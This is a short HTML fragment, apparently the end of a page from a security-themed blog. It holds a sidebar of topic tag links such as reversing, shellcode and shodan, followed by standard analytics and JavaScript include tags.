        <a href='https://artik.blue/tag/hacktivists/'>hacktivists</a>
        
        <a href='https://artik.blue/tag/linux/'>linux</a>
        
        <a href='https://artik.blue/tag/opsec/'>opsec</a>
        
        <a href='https://artik.blue/tag/processing/'>processing</a>
        
        <a href='https://artik.blue/tag/python/'>python</a>
        
        <a href='https://artik.blue/tag/r/'>r</a>
        
        <a href='https://artik.blue/tag/radare/'>radare</a>
        
        <a href='https://artik.blue/tag/relay/'>relay</a>
        
        <a href='https://artik.blue/tag/reversing/'>reversing</a>
        
        <a href='https://artik.blue/tag/shellcode/'>shellcode</a>
        
        <a href='https://artik.blue/tag/shodan/'>shodan</a>
        
    </div>
</section>


		</div><!-- .sidebar-inside -->
	</div><!-- .sidebar-scrollable -->
</aside><!-- .sidebar -->
    
  <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', '', { 'anonymize_ip': true });
  </script>

    <!-- Javascript Assets -->
    <script src="assets/js/jquery-3.3.1.min.js"></script>
    <script src="assets/js/plugins.js"></script>
    <script src="assets/js/custom.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>

</body>

</html>